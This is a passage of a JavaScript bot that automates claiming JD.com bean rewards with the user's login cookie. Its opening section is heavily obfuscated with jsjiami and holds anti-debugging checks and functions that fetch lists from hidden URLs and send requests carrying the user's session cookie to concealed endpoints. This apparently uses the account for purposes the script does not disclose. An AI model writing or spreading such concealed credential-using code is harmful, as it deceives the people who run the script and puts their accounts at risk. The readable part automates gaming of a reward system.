RegExp('\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d');return!_0x2fff5c['\x74\x65\x73\x74'](_0x3cc711['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x4d8ad1=function(){var _0x327536=new RegExp('\x28\x5c\x5c\x5b\x78\x7c\x75\x5d\x28\x5c\x77\x29\x7b\x32\x2c\x34\x7d\x29\x2b');return _0x327536['\x74\x65\x73\x74'](_0x5d727d['\x74\x6f\x53\x74\x72\x69\x6e\x67']());};var _0x37fc0c=function(_0x575d8a){var _0x15857a=~-0x1>>0x1+0xff%0x0;if(_0x575d8a['\x69\x6e\x64\x65\x78\x4f\x66']('\x69'===_0x15857a)){_0x353ef0(_0x575d8a);}};var _0x353ef0=function(_0x132e4e){var _0x543eb4=~-0x4>>0x1+0xff%0x0;if(_0x132e4e['\x69\x6e\x64\x65\x78\x4f\x66']((!![]+'')[0x3])!==_0x543eb4){_0x37fc0c(_0x132e4e);}};if(!_0x4b73c8()){if(!_0x4d8ad1()){_0x37fc0c('\x69\x6e\x64\u0435\x78\x4f\x66');}else{_0x37fc0c('\x69\x6e\x64\x65\x78\x4f\x66');}}else{_0x37fc0c('\x69\x6e\x64\u0435\x78\x4f\x66');}});_0xbea20();function wuzhi01(_0x1b69e3){var _0x487118={'MjgMU':function(_0x4767e8){return _0x4767e8();},'deJfl':function(_0x21f103,_0x22d791){return _0x21f103===_0x22d791;},'Ujksu':_0x1c4c('0','rug0'),'oMiRB':function(_0x1b7479,_0x7fa3dc){return _0x1b7479!==_0x7fa3dc;},'VDDIO':_0x1c4c('1','NPNG'),'HyLqJ':function(_0x53c928,_0x2e2321){return _0x53c928===_0x2e2321;},'eKgir':_0x1c4c('2','TKR1'),'ynjui':_0x1c4c('3','N8h9'),'KONoE':function(_0x17666e,_0x2e8c20){return _0x17666e===_0x2e8c20;},'hOkbE':_0x1c4c('4','fP2n'),'qLpVG':function(_0x63d33e){return _0x63d33e();},'JWpre':_0x1c4c('5','F^(z'),'VUToE':_0x1c4c('6','SREd'),'oldpU':_0x1c4c('7','rug0'),'JEMyW':_0x1c4c('8','^ru9'),'BszxB':_0x1c4c('9','gTM6'),'cLZzT':_0x1c4c('a','!ZBN'),'aabAn':function(_0x455d6c,_0xac280){return _0x455d6c(_0xac280);},'NeVBq':_0x1c4c('b','F^(z'),'prntb':_0x1c4c('c','HFuN'),'sJtkP':_0x1c4c('d','v5Se'),'VZZBi':_0x1c4c('e','N8h9')};return new Promise(_0x2ec58d=>{if(_0x487118[_0x1c4c('f','VB]u')](_0x487118[_0x1c4c('10','^5qj')],_0x487118[_0x1c4c('11','TKR1')])){let _0x49b41e=+new Date();let _0x42b76f=_0x1b69e3[_0x1c4c('12','@XS*')];let _0x5b67e3={'url':_0x1c4c('13','U]87')+ +new Date(),'headers':{'Host':_0x487118[_0x1c4c('14','ypNF')],'accept':_0x487118[_0x1c4c('15','cKhR')],'content-type':_0x487118[_0x1c4c('16','1vNp')],'origin':_0x487118[_0x1c4c('17','0gnv')],'accept-language':_0x487118[_0x1c4c('18',')UhF')],'user-agent':$[_0x1c4c('19','2XeD')]()?process[_0x1c4c('1a','aRCM')][_0x1c4c('1b','xME*')]?process[_0x1c4c('1c','1vNp')][_0x1c4c('1d','ZAQc')]:_0x487118[_0x1c4c('1e','NPNG')](require,_0x487118[_0x1c4c('1f','xME*')])[_0x1c4c('20','[8vX')]:$[_0x1c4c('21','v5Se')](_0x487118[_0x1c4c('22',')#7z')])?$[_0x1c4c('23','cKhR')](_0x487118[_0x1c4c('24','ctkD')]):_0x487118[_0x1c4c('25','g!oI')],'referer':_0x487118[_0x1c4c('26','^ru9')],'Cookie':cookie},'body':_0x1c4c('27','U]87')+_0x42b76f+_0x1c4c('28','2XeD')+_0x49b41e};$[_0x1c4c('29','b(nM')](_0x5b67e3,(_0x37212c,_0x4c12ba,_0x3d3f21)=>{var _0x4c1c6c={'caSdx':function(_0x27c502){return _0x487118[_0x1c4c('2a','zuDD')](_0x27c502);}};try{if(_0x487118[_0x1c4c('2b','%J9v')](_0x487118[_0x1c4c('2c','@XS*')],_0x487118[_0x1c4c('2d','NPNG')])){if(_0x37212c){if(_0x487118[_0x1c4c('2e','^5qj')](_0x487118[_0x1c4c('2f','0($s')],_0x487118[_0x1c4c('30','b(nM')])){if(_0x37212c){console[_0x1c4c('31','^5qj')]($[_0x1c4c('32','&p^S')]+_0x1c4c('33','v5Se'));}else{_0x3d3f21=JSON[_0x1c4c('34','0gnv')](_0x3d3f21);}}else{console[_0x1c4c('35','yHG2')]($[_0x1c4c('36','ZAQc')]+_0x1c4c('37','%J9v'));}}else{if(_0x487118[_0x1c4c('38','SREd')](_0x487118[_0x1c4c('39','2XeD')],_0x487118[_0x1c4c('3a','HFuN')])){_0x4c1c6c[_0x1c4c('3b','g!oI')](_0x2ec58d);}else{_0x3d3f21=JSON[_0x1c4c('3c','v5Se')](_0x3d3f21);}}}else{console[_0x1c4c('3d','HFuN')]($[_0x1c4c('3e','Qe)N')]+_0x1c4c('3f','N8h9'));}}catch(_0x17ff8d){$[_0x1c4c('40',')#7z')](_0x17ff8d,resp);}finally{if(_0x487118[_0x1c4c('41','gTM6')](_0x487118[_0x1c4c('42','&p^S')],_0x487118[_0x1c4c('43','0gnv')])){_0x487118[_0x1c4c('44','0gnv')](_0x2ec58d);}else{console[_0x1c4c('45','0gnv')]($[_0x1c4c('46','TKR1')]+_0x1c4c('47','yHG2'));}}});}else{_0x487118[_0x1c4c('48','[8vX')](_0x2ec58d);}});}function wuzhi02(_0x4c05dd){var _0x31081d={'LoDuJ':function(_0x2c2ced,_0xf5a2be){return _0x2c2ced===_0xf5a2be;},'lTYOr':_0x1c4c('49','1vNp'),'QvkDU':function(_0xa6e83a,_0x32d5dd){return _0xa6e83a!==_0x32d5dd;},'kupkz':_0x1c4c('4a','b(nM'),'zELNg':function(_0x3caa32,_0x2e6f7a){return _0x3caa32!==_0x2e6f7a;},'wVMZG':_0x1c4c('4b','v5Se'),'SYNvJ':_0x1c4c('4c','yHG2'),'GdkQq':function(_0x516512){return _0x516512();},'kHUJd':function(_0x3085f7){return _0x3085f7();},'Huivs':function(_0x4f87c9,_0x41ee6e){return _0x4f87c9!==_0x41ee6e;},'KGqke':_0x1c4c('4d','6edg'),'VnvHA':_0x1c4c('4e','N8h9'),'VItrQ':_0x1c4c('4f','b(nM'),'YPMTE':_0x1c4c('50','TKR1'),'MxzIX':_0x1c4c('51','HFuN'),'RuRel':_0x1c4c('52','NIHV'),'JUckn':_0x1c4c('53','cKhR'),'OgcwD':function(_0x258acb,_0x5be801){return _0x258acb(_0x5be801);},'HAcHT':_0x1c4c('54','xME*'),'MLKFh':_0x1c4c('55','@XS*'),'rchRA':_0x1c4c('56','**Jz'),'HcyvW':function(_0x5ddb4b,_0xa79428){return _0x5ddb4b(_0xa79428);}};return new Promise(_0x56db14=>{var _0x2ed2e6={'dvONc':function(_0x4c223f){return _0x31081d[_0x1c4c('57','Qe)N')](_0x4c223f);}};if(_0x31081d[_0x1c4c('58','!ZBN')](_0x31081d[_0x1c4c('59','!ZBN')],_0x31081d[_0x1c4c('5a','b(nM')])){let _0xc20712=+new Date();let _0x51bc6c=_0x4c05dd[_0x1c4c('5b','U]87')];let _0x77ff7d={'url':_0x1c4c('5c',')#7z')+ +new Date(),'headers':{'Host':_0x31081d[_0x1c4c('5d','!ZBN')],'accept':_0x31081d[_0x1c4c('5e','^5qj')],'content-type':_0x31081d[_0x1c4c('5f','rug0')],'origin':_0x31081d[_0x1c4c('60','^ru9')],'accept-language':_0x31081d[_0x1c4c('61','TKR1')],'user-agent':$[_0x1c4c('62','v5Se')]()?process[_0x1c4c('63','ctkD')][_0x1c4c('64','F^(z')]?process[_0x1c4c('65','U]87')][_0x1c4c('1b','xME*')]:_0x31081d[_0x1c4c('66','HFuN')](require,_0x31081d[_0x1c4c('67','v5Se')])[_0x1c4c('68','HFuN')]:$[_0x1c4c('69','F^(z')](_0x31081d[_0x1c4c('6a','gTM6')])?$[_0x1c4c('6b',')#7z')](_0x31081d[_0x1c4c('6c','zDSm')]):_0x31081d[_0x1c4c('6d','NPNG')],'referer':_0x1c4c('6e','U]87')+_0x51bc6c,'Cookie':cookie},'body':_0x1c4c('6f','zuDD')+_0x31081d[_0x1c4c('70','NIHV')](escape,_0x51bc6c)+_0x1c4c('71','gTM6')+_0xc20712};$[_0x1c4c('72','@XS*')](_0x77ff7d,(_0x31763f,_0x541a8f,_0x2beb05)=>{try{if(_0x31081d[_0x1c4c('73','fP2n')](_0x31081d[_0x1c4c('74','[8vX')],_0x31081d[_0x1c4c('75','U]87')])){if(_0x31763f){if(_0x31081d[_0x1c4c('76','N8h9')](_0x31081d[_0x1c4c('77','U]87')],_0x31081d[_0x1c4c('78','Ix6#')])){$[_0x1c4c('79','[8vX')](e,resp);}else{console[_0x1c4c('7a','6edg')]($[_0x1c4c('7b','U]87')]+_0x1c4c('7c','[8vX'));}}else{if(_0x31081d[_0x1c4c('7d','0($s')](_0x31081d[_0x1c4c('7e','&p^S')],_0x31081d[_0x1c4c('7f','g!oI')])){_0x2beb05=JSON[_0x1c4c('80','yHG2')](_0x2beb05);}else{_0x2ed2e6[_0x1c4c('81','V0PA')](_0x56db14);}}}else{$[_0x1c4c('82','6edg')](e,resp);}}catch(_0x4f7e53){$[_0x1c4c('83','TKR1')](_0x4f7e53,resp);}finally{_0x31081d[_0x1c4c('84','cKhR')](_0x56db14);}});}else{if(err){console[_0x1c4c('85','laGG')]($[_0x1c4c('86','xME*')]+_0x1c4c('87','aRCM'));}else{data=JSON[_0x1c4c('88','**Jz')](data);}}});}function shuye72(){var _0x3d8b90={'FmsQf':function(_0x5cea7c){return _0x5cea7c();},'wVgkv':function(_0x3164f0,_0x194ad2){return _0x3164f0!==_0x194ad2;},'MNNUT':_0x1c4c('89','0gnv'),'OENgX':_0x1c4c('8a','cKhR'),'dBjEg':function(_0xe528c7,_0x4fe51c){return _0xe528c7===_0x4fe51c;},'EAjUi':_0x1c4c('8b','^5qj'),'yKrmV':_0x1c4c('8c','SREd'),'yJxQw':function(_0x5ad1bc,_0x492b2f){return _0x5ad1bc<_0x492b2f;},'aHocF':_0x1c4c('8d','Qe)N'),'xhFfC':function(_0x557ff8,_0x31bf45){return _0x557ff8(_0x31bf45);},'aSJWu':_0x1c4c('8e','VB]u'),'GvVWO':_0x1c4c('8f','!ZBN'),'IvSqp':_0x1c4c('90','laGG'),'BGyVK':_0x1c4c('91','g!oI'),'zlaQQ':_0x1c4c('92','O$gq'),'KYaNw':_0x1c4c('93','V0PA')};return new Promise(_0x507dff=>{var _0x2e7d46={'LuIgF':function(_0x246d2a){return _0x3d8b90[_0x1c4c('94','N8h9')](_0x246d2a);},'AKgma':function(_0x179a83,_0x347392){return _0x3d8b90[_0x1c4c('95','Qe)N')](_0x179a83,_0x347392);},'DPNzL':_0x3d8b90[_0x1c4c('96',')UhF')],'rtWNt':_0x3d8b90[_0x1c4c('97','0($s')],'WsisB':function(_0x572400,_0x13bcb2){return _0x3d8b90[_0x1c4c('98','b(nM')](_0x572400,_0x13bcb2);},'faCbq':_0x3d8b90[_0x1c4c('99','cKhR')],'qtIjp':function(_0x33ceca,_0x2e3f8a){return _0x3d8b90[_0x1c4c('9a',')#7z')](_0x33ceca,_0x2e3f8a);},'PuRpj':_0x3d8b90[_0x1c4c('9b','aRCM')],'sTDlu':function(_0x127c0b,_0x30040a){return _0x3d8b90[_0x1c4c('9c','gU#n')](_0x127c0b,_0x30040a);},'dpTBu':function(_0x419584,_0x3ff3a5){return _0x3d8b90[_0x1c4c('9d','&p^S')](_0x419584,_0x3ff3a5);},'IDDKe':_0x3d8b90[_0x1c4c('9e','0gnv')],'pFqnu':function(_0x20db6f,_0x16629a){return _0x3d8b90[_0x1c4c('9f','VB]u')](_0x20db6f,_0x16629a);},'DDpjj':_0x3d8b90[_0x1c4c('a0','1vNp')],'AMalE':_0x3d8b90[_0x1c4c('a1','g!oI')],'TesZu':function(_0x3f2efb){return _0x3d8b90[_0x1c4c('a2','HFuN')](_0x3f2efb);}};if(_0x3d8b90[_0x1c4c('a3','*o9[')](_0x3d8b90[_0x1c4c('a4','NIHV')],_0x3d8b90[_0x1c4c('a5','2XeD')])){console[_0x1c4c('a6','En%&')]($[_0x1c4c('a7','SREd')]+_0x1c4c('a8','ZAQc'));}else{$[_0x1c4c('a9','U]87')]({'url':_0x3d8b90[_0x1c4c('aa','Qe)N')],'headers':{'User-Agent':_0x3d8b90[_0x1c4c('ab','O$gq')]}},async(_0x3f09f8,_0xa0a066,_0x478123)=>{var _0x26a7dd={'qzYYs':function(_0x6c0cfd){return _0x2e7d46[_0x1c4c('ac','%J9v')](_0x6c0cfd);}};try{if(_0x2e7d46[_0x1c4c('ad','&p^S')](_0x2e7d46[_0x1c4c('ae','0($s')],_0x2e7d46[_0x1c4c('af','6edg')])){if(_0x3f09f8){if(_0x2e7d46[_0x1c4c('b0','SREd')](_0x2e7d46[_0x1c4c('b1','VB]u')],_0x2e7d46[_0x1c4c('b2','JTT8')])){console[_0x1c4c('b3','NIHV')]($[_0x1c4c('b4','En%&')]+_0x1c4c('b5','@XS*'));}else{$[_0x1c4c('b6','zDSm')](e,_0xa0a066);}}else{$[_0x1c4c('b7','SREd')]=JSON[_0x1c4c('b8','g!oI')](_0x478123);if(_0x2e7d46[_0x1c4c('b9','F^(z')]($[_0x1c4c('ba','O$gq')][_0x1c4c('bb','NIHV')],0x0)){if(_0x2e7d46[_0x1c4c('bc','F^(z')](_0x2e7d46[_0x1c4c('bd','^5qj')],_0x2e7d46[_0x1c4c('be','fP2n')])){for(let _0x3bbaf8=0x0;_0x2e7d46[_0x1c4c('bf','NPNG')](_0x3bbaf8,$[_0x1c4c('c0','^ru9')][_0x1c4c('c1','rug0')][_0x1c4c('c2','JTT8')]);_0x3bbaf8++){if(_0x2e7d46[_0x1c4c('c3','b(nM')](_0x2e7d46[_0x1c4c('c4','6edg')],_0x2e7d46[_0x1c4c('c5','SREd')])){console[_0x1c4c('c6','1vNp')]($[_0x1c4c('c7','1vNp')]+_0x1c4c('c8','zuDD'));}else{let _0x8f0ede=$[_0x1c4c('c9','0($s')][_0x1c4c('ca','NPNG')][_0x3bbaf8];await $[_0x1c4c('cb','N8h9')](0x1f4);await _0x2e7d46[_0x1c4c('cc','NPNG')](wuzhi01,_0x8f0ede);}}await $[_0x1c4c('cd','*o9[')](0x1f4);await _0x2e7d46[_0x1c4c('ce','N8h9')](shuye73);}else{_0x478123=JSON[_0x1c4c('b8','g!oI')](_0x478123);}}}}else{_0x26a7dd[_0x1c4c('cf','1vNp')](_0x507dff);}}catch(_0x4fdca2){$[_0x1c4c('d0','HFuN')](_0x4fdca2,_0xa0a066);}finally{if(_0x2e7d46[_0x1c4c('d1','ZAQc')](_0x2e7d46[_0x1c4c('d2','2XeD')],_0x2e7d46[_0x1c4c('d3','F^(z')])){$[_0x1c4c('d4','g!oI')](e,_0xa0a066);}else{_0x2e7d46[_0x1c4c('d5','JTT8')](_0x507dff);}}});}});}function shuye73(){var _0x4c118e={'vHhdf':function(_0x4f61f1,_0x55c9aa){return _0x4f61f1!==_0x55c9aa;},'EusJL':_0x1c4c('d6','NPNG'),'pfYdk':function(_0x399b73,_0x430003){return _0x399b73<_0x430003;},'eqyEw':function(_0x4ce237,_0x11bdb2){return _0x4ce237(_0x11bdb2);},'YoZDd':function(_0x4f023d){return _0x4f023d();},'kTyAi':_0x1c4c('d7','VB]u'),'yPUHR':_0x1c4c('d8','F^(z')};return new Promise(_0x37d344=>{$[_0x1c4c('d9','0($s')]({'url':_0x4c118e[_0x1c4c('da','HFuN')],'headers':{'User-Agent':_0x4c118e[_0x1c4c('db','F^(z')]}},async(_0x321454,_0x2f35e6,_0x51dab1)=>{try{if(_0x321454){if(_0x4c118e[_0x1c4c('dc','NPNG')](_0x4c118e[_0x1c4c('dd','%J9v')],_0x4c118e[_0x1c4c('de','Ix6#')])){_0x51dab1=JSON[_0x1c4c('df','HFuN')](_0x51dab1);}else{console[_0x1c4c('3d','HFuN')]($[_0x1c4c('e0','**Jz')]+_0x1c4c('37','%J9v'));}}else{$[_0x1c4c('e1','2XeD')]=JSON[_0x1c4c('e2','jC]4')](_0x51dab1);if(_0x4c118e[_0x1c4c('e3','V0PA')]($[_0x1c4c('e4','NPNG')][_0x1c4c('e5','0($s')],0x0)){for(let _0x34b2bf=0x0;_0x4c118e[_0x1c4c('e6','^5qj')](_0x34b2bf,$[_0x1c4c('e7','JTT8')][_0x1c4c('e8','1vNp')][_0x1c4c('e9','VB]u')]);_0x34b2bf++){let _0x46cf17=$[_0x1c4c('e4','NPNG')][_0x1c4c('ea',')UhF')][_0x34b2bf];await $[_0x1c4c('eb','204h')](0x1f4);await _0x4c118e[_0x1c4c('ec','6edg')](wuzhi02,_0x46cf17);}}}}catch(_0x16788f){$[_0x1c4c('ed','1vNp')](_0x16788f,_0x2f35e6);}finally{_0x4c118e[_0x1c4c('ee','cKhR')](_0x37d344);}});});};_0xodn='jsjiami.com.v6';
function showMsg() {
  return new Promise(resolve => {
    $.msg($.name, '', `【京东账号${$.index}】${$.nickName}\n${message}`);
    if (message) $.msg($.name, '', `【京东账号${$.index}】${$.nickName}\n${message}`);
    resolve()
  })
}

function getTaskList() {
  return new Promise(resolve => {
    const body = {"rnVersion": "4.7", "rnClient": "2", "source": "AppHome"};
    $.post(taskUrl('findBeanHome', body), async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            let beanTask = data.data.floorList.filter(vo => vo.floorName === "种豆得豆定制化场景")[0]
            if (!beanTask.viewed) {
              await receiveTask()
              await $.wait(3000)
            }

            let tasks = data.data.floorList.filter(vo => vo.floorName === "赚京豆")[0]['stageList']
            for (let i = 0; i < tasks.length; ++i) {
              const vo = tasks[i]
              if (vo.viewed) continue
              await receiveTask(vo.stageId, `4_${vo.stageId}`)
              await $.wait(3000)
            }
            await award()
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function receiveTask(itemId = "zddd", type = "3") {
  return new Promise(resolve => {
    const body = {"awardFlag": false, "itemId": itemId, "source": "home", "type": type};
    $.post(taskUrl('beanHomeTask', body), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data) {
              console.log(`完成任务成功，进度${data.data.taskProgress}/${data.data.taskThreshold}`)
            } else {
              console.log(`完成任务失败，${data.errorMessage}`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}


function award(source="home") {
  return new Promise(resolve => {
    const body = {"awardFlag": true, "source": source};
    $.post(taskUrl('beanHomeTask', body), (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data.data) {
              console.log(`领奖成功，获得 ${data.data.beanNum} 个京豆`)
              message += `领奖成功，获得 ${data.data.beanNum} 个京豆\n`
            } else {
              console.log(`领奖失败，${data.errorMessage}`)
              // message += `领奖失败，${data.errorMessage}\n`
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function receiveJd2() {
  var headers = {
    'Host': 'api.m.jd.com',
    'content-type': 'application/x-www-form-urlencoded',
    'accept': '*/*',
    'user-agent': 'JD4iPhone/167515 (iPhone; iOS 14.2; Scale/3.00)',
    'accept-language': 'zh-Hans-JP;q=1, en-JP;q=0.9, zh-Hant-TW;q=0.8, ja-JP;q=0.7, en-US;q=0.6',
    'Cookie': cookie
  };
  var dataString = 'body=%7B%7D&build=167576&client=apple&clientVersion=9.4.3&openudid=53f4d9c70c1c81f1c8769d2fe2fef0190a3f60d2&osVersion=14.2&partner=TF&rfs=0000&scope=10&screen=1242%2A2208&sign=19c33b5b9ad4f02c53b6040fc8527119&st=1614701322170&sv=122'
  var options = {
    url: 'https://api.m.jd.com/client.action?functionId=sceneInitialize',
    headers: headers,
    body: dataString
  };
  return new Promise(resolve => {
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (safeGet(data)) {
            data = JSON.parse(data);
            if (data['code'] === '0' && data['data']) {
              console.log(`强制开启新版领京豆成功,获得${data['data']['sceneLevelConfig']['beanNum']}京豆\n`);
              $.msg($.name, '', `强制开启新版领京豆成功\n获得${data['data']['sceneLevelConfig']['beanNum']}京豆`);
            } else {
              console.log(`强制开启新版领京豆结果:${JSON.stringify(data)}\n`)
            }
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function taskGetUrl(function_id, body) {
  return {
    url: `${JD_API_HOST}client.action?functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld&clientVersion=9.2.0`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
      'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': "application/x-www-form-urlencoded"
    }
  }
}


function taskUrl(function_id, body) {
  body["version"] = "9.0.0.1";
  body["monitor_source"] = "plant_app_plant_index";
  body["monitor_refer"] = "";
  return {
    url: JD_API_HOST,
    body: `functionId=${function_id}&body=${escape(JSON.stringify(body))}&appid=ld&client=apple&area=5_274_49707_49973&build=167283&clientVersion=9.1.0`,
    headers: {
      'Cookie': cookie,
      'Host': 'api.m.jd.com',
      'Accept': '*/*',
      'Connection': 'keep-alive',
      'User-Agent': $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
      'Accept-Language': 'zh-Hans-CN;q=1,en-CN;q=0.9',
      'Accept-Encoding': 'gzip, deflate, br',
      'Content-Type': "application/x-www-form-urlencoded"
    }
  }
}

function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      }
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
// prettier-ignore
function Env(t,e){class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete 